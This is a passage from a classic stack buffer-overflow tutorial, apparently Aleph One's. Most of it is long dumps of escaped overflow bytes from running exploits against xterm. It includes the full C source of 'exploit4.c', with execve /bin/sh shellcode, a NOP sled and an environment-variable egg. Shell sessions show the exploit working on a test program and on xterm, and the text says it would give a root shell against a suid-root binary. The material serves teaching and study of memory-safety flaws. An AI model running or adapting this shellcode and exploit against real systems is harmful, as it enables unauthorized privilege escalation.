\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4 \u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4\u00ff\u00bf\u00a4\u00a4 ^C [aleph1]$ exit [aleph1]$ ./exploit3 2148 100 Using address: 0xbffffd48 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4 \u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH \u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bf H\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff \u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff\u00bfH\u00a4\u00ff Warning: some arguments in previous message were lost Illegal instruction [aleph1]$ exit . . . [aleph1]$ ./exploit4 2148 600 Using address: 0xbffffb54 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"\u00eb^1\u00a4FF \u00b0 \u00f3V \u00a41\u00a4\u00d8@\u00a4\u00e8\u00dc\u00ff\u00ff\u00ff/bin/sh\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb \u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT \u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bf T\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff \u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff\u00bfT\u00fb\u00ff Warning: some arguments in previous message were lost bash$ ------------------------------------------------------------------------------ Eureka! Less than a dozen tries and we found the magic numbers. If xterm where installed suid root this would now be a root shell. Small Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~ There will be times when the buffer you are trying to overflow is so small that either the shellcode wont fit into it, and it will overwrite the return address with instructions instead of the address of our code, or the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule. To obtain a shell from these programs we will have to go about it another way. This particular approach only works when you have access to the program's environment variables. What we will do is place our shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory. This method also increases your changes of the exploit working as you can make the environment variable holding the shell code as large as you want. The environment variables are stored in the top of the stack when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the beginning then looks like this: <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our new exploit now looks like this: exploit4.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_esp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (argc > 3) eggsize = atoi(argv[3]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_esp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i < eggsize - strlen(shellcode) - 1; i++) *(ptr++) = NOP; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(buff,\"RET=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Lets try our new exploit with our vulnerable test program: ------------------------------------------------------------------------------ [aleph1]$ ./exploit4 768 Using address: 0xbffffdb0 [aleph1]$ ./vulnerable $RET $ ------------------------------------------------------------------------------ Works like a charm. Now lets try it on xterm: ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit4 2148 Using address: 0xbffffdb0 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET Warning: Color name \"\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0 \u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf 